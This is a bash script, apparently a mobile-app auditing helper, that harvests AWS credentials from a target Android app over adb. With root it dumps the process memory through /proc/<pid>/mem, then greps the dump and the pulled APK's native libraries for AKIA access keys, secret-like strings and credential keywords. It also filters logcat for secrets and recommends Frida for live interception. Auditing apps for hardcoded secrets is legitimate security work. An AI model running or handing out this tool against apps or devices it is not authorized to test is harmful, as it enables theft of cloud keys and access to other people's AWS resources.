#!/bin/bash

# Helper script to extract credentials from Android app memory dumps
# Usage: ./extract_credentials_helper.sh <package_name>

PACKAGE_NAME="${1:-com.rustexample}"
OUTPUT_DIR="./credential_extraction_$(date +%Y%m%d_%H%M%S)"
PATTERNS_FILE="${OUTPUT_DIR}/patterns.txt"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}Credential Extraction Helper${NC}"
echo "Package: $PACKAGE_NAME"
echo "Output directory: $OUTPUT_DIR"
echo ""

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Function to check if device is connected
check_adb() {
    if ! command -v adb &> /dev/null; then
        echo -e "${RED}Error: adb not found. Please install Android SDK Platform Tools.${NC}"
        exit 1
    fi
    
    if ! adb devices | grep -q "device$"; then
        echo -e "${RED}Error: No Android device connected or authorized.${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] ADB connection OK${NC}"
}

# Function to get process ID
get_pid() {
    PID=$(adb shell pidof "$PACKAGE_NAME" 2>/dev/null | tr -d '\r')
    if [ -z "$PID" ]; then
        echo -e "${YELLOW}[!] Process not running. Starting app...${NC}"
        adb shell monkey -p "$PACKAGE_NAME" -c android.intent.category.LAUNCHER 1
        sleep 3
        PID=$(adb shell pidof "$PACKAGE_NAME" 2>/dev/null | tr -d '\r')
    fi
    
    if [ -z "$PID" ]; then
        echo -e "${RED}Error: Could not find process ID for $PACKAGE_NAME${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Process ID: $PID${NC}"
    echo "$PID" > "${OUTPUT_DIR}/pid.txt"
}

# Function to create memory dump (requires root)
create_memory_dump() {
    echo -e "${YELLOW}[*] Attempting to create memory dump...${NC}"
    echo -e "${YELLOW}[!] This requires root access${NC}"
    
    # Check if device is rooted
    if ! adb shell su -c "id" | grep -q "uid=0"; then
        echo -e "${RED}Error: Device is not rooted. Memory dump requires root.${NC}"
        echo -e "${YELLOW}Alternative: Use Frida script instead (frida_extract_credentials.js)${NC}"
        return 1
    fi
    
    DUMP_FILE="/sdcard/memory_dump_${PID}.bin"
    echo -e "${YELLOW}[*] Creating memory dump (this may take a while)...${NC}"
    
    # Method 1: Using /proc/<pid>/mem (requires root)
    adb shell su -c "dd if=/proc/${PID}/mem of=${DUMP_FILE} bs=1024 count=10240 2>/dev/null" || {
        echo -e "${RED}Error: Could not create memory dump${NC}"
        return 1
    }
    
    # Pull dump to local machine
    adb pull "$DUMP_FILE" "${OUTPUT_DIR}/memory_dump.bin" || {
        echo -e "${RED}Error: Could not pull memory dump${NC}"
        return 1
    }
    
    echo -e "${GREEN}[+] Memory dump created: ${OUTPUT_DIR}/memory_dump.bin${NC}"
    
    # Clean up on device
    adb shell su -c "rm $DUMP_FILE"
}

# Function to extract strings from dump
extract_strings() {
    if [ ! -f "${OUTPUT_DIR}/memory_dump.bin" ]; then
        echo -e "${YELLOW}[!] Memory dump not found, skipping string extraction${NC}"
        return
    fi
    
    echo -e "${YELLOW}[*] Extracting strings from memory dump...${NC}"
    
    # Extract all strings
    strings "${OUTPUT_DIR}/memory_dump.bin" > "${OUTPUT_DIR}/all_strings.txt" 2>/dev/null || {
        echo -e "${RED}Error: strings command not found. Install binutils.${NC}"
        return
    }
    
    echo -e "${GREEN}[+] Extracted strings to ${OUTPUT_DIR}/all_strings.txt${NC}"
    
    # Search for AWS access key pattern (AKIA...)
    echo -e "${YELLOW}[*] Searching for AWS Access Key IDs...${NC}"
    grep -E "AKIA[0-9A-Z]{16}" "${OUTPUT_DIR}/all_strings.txt" > "${OUTPUT_DIR}/access_keys.txt" 2>/dev/null || echo "No access keys found"
    
    # Search for potential secret keys (base64-like, 40 chars)
    echo -e "${YELLOW}[*] Searching for potential secret keys...${NC}"
    grep -E "[a-zA-Z0-9+/]{38,42}" "${OUTPUT_DIR}/all_strings.txt" | head -100 > "${OUTPUT_DIR}/potential_secrets.txt" 2>/dev/null
    
    # Search for credential-related keywords
    echo -e "${YELLOW}[*] Searching for credential keywords...${NC}"
    grep -iE "access_key|secret|credential|aws|s3|bucket" "${OUTPUT_DIR}/all_strings.txt" > "${OUTPUT_DIR}/credential_keywords.txt" 2>/dev/null || echo "No keywords found"
    
    echo -e "${GREEN}[+] Search results saved to ${OUTPUT_DIR}/${NC}"
}

# Function to monitor logcat
monitor_logcat() {
    echo -e "${YELLOW}[*] Starting logcat monitoring (Ctrl+C to stop)...${NC}"
    adb logcat -c  # Clear logcat
    adb logcat | grep -iE "access_key|secret|credential|s3|bucket|timon" | tee "${OUTPUT_DIR}/logcat_monitor.txt"
}

# Function to check for Frida
check_frida() {
    if command -v frida &> /dev/null; then
        echo -e "${GREEN}[+] Frida found${NC}"
        echo -e "${YELLOW}[*] To use Frida script:${NC}"
        echo "   frida -U -f $PACKAGE_NAME -l frida_extract_credentials.js --no-pause"
        return 0
    else
        echo -e "${YELLOW}[!] Frida not found. Install with: pip install frida-tools${NC}"
        return 1
    fi
}

# Function to extract APK and analyze
extract_apk() {
    echo -e "${YELLOW}[*] Extracting APK...${NC}"
    
    # Find APK path
    APK_PATH=$(adb shell pm path "$PACKAGE_NAME" | cut -d: -f2 | tr -d '\r')
    
    if [ -z "$APK_PATH" ]; then
        echo -e "${RED}Error: Could not find APK path${NC}"
        return 1
    fi
    
    # Pull APK
    adb pull "$APK_PATH" "${OUTPUT_DIR}/app.apk" || {
        echo -e "${RED}Error: Could not pull APK${NC}"
        return 1
    }
    
    echo -e "${GREEN}[+] APK extracted: ${OUTPUT_DIR}/app.apk${NC}"
    
    # Extract strings from APK
    if command -v strings &> /dev/null; then
        echo -e "${YELLOW}[*] Extracting strings from APK...${NC}"
        unzip -q -o "${OUTPUT_DIR}/app.apk" -d "${OUTPUT_DIR}/apk_extracted" 2>/dev/null || true
        
        # Search in native libraries
        find "${OUTPUT_DIR}/apk_extracted" -name "*.so" -exec strings {} \; > "${OUTPUT_DIR}/apk_strings.txt" 2>/dev/null || true
        
        # Search for credentials in APK strings
        grep -iE "AKIA|access_key|secret" "${OUTPUT_DIR}/apk_strings.txt" > "${OUTPUT_DIR}/apk_credentials.txt" 2>/dev/null || echo "No credentials found in APK"
        
        echo -e "${GREEN}[+] APK analysis complete${NC}"
    fi
}

# Main execution
main() {
    check_adb
    get_pid
    
    echo ""
    echo -e "${GREEN}=== Extraction Methods ===${NC}"
    echo "1. Memory dump (requires root)"
    echo "2. Logcat monitoring"
    echo "3. APK extraction and analysis"
    echo "4. Frida script (recommended)"
    echo ""
    
    # Create memory dump if possible
    create_memory_dump && extract_strings
    
    # Extract APK
    extract_apk
    
    # Check for Frida
    check_frida
    
    echo ""
    echo -e "${GREEN}=== Results ===${NC}"
    echo "Output directory: $OUTPUT_DIR"
    echo ""
    echo "Files created:"
    ls -lh "$OUTPUT_DIR" | tail -n +2
    
    echo ""
    echo -e "${YELLOW}Next steps:${NC}"
    echo "1. Review extracted files in $OUTPUT_DIR"
    echo "2. Use Frida script for real-time credential interception"
    echo "3. Check logcat_monitor.txt for runtime logs"
}

# Run main function
main
